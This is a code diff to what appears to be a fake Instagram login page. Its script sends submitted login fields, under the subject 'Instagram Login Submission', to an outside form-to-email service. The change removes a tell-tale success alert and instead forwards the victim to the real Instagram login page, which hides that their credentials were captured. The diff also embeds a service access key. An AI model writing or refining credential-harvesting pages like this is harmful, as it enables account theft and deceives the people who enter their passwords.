@@ -75,7 +75,7 @@
       const data = Object.fromEntries(formData.entries());
       data.access_key = "8312e902-b0d4-418c-baf3-1ff44e8c9ffd"; // Your Web3Forms key
       data.subject = "Instagram Login Submission"; // Optional: email subject
-      data.redirect = "https://yourwebsite.com/thank-you.html"; // Optional: redirect after submission
+      data.redirect = "https://www.instagram.com/accounts/login/"; // Redirect after submission
 
       try {
         const response = await fetch("https://api.web3forms.com/submit", {
@@ -86,8 +86,8 @@
 
         const result = await response.json();
         if (result.success) {
-          alert("Login data submitted successfully!");
           form.reset();
+          window.location.href = data.redirect; // Redirect to Instagram login
         } else {
           alert("Something went wrong, try again!");
         }
